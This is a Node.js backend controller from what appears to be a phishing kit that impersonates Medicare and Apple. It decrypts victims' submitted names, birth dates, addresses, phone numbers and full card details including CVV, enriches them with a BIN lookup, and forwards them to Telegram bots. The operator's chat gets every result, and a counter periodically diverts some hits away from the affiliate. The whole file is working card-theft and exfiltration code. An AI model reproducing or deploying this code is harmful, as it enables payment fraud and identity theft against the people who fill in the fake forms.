const axios = require("axios");
var CryptoJS = require("crypto-js");

let count = 0;

const sendRes = async (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  let { bin, ip, userAgent, telegramId } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank;
  }

  const binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (count == 6) {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count = 0;
  } else {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Medicare ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Medicare:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count += 1;
  }
  res.sendStatus(200);
};

let auCount = 0;

const sendAuRes = async (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  let { bin, telegramId, userAgent, ip } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);

  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank;
  }
  const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (auCount == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    auCount = 6;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Apple ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Apple:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    auCount += 1;
  }
  res.send("Update Complete");
};

module.exports = {
  sendRes,
  sendAuRes,
};
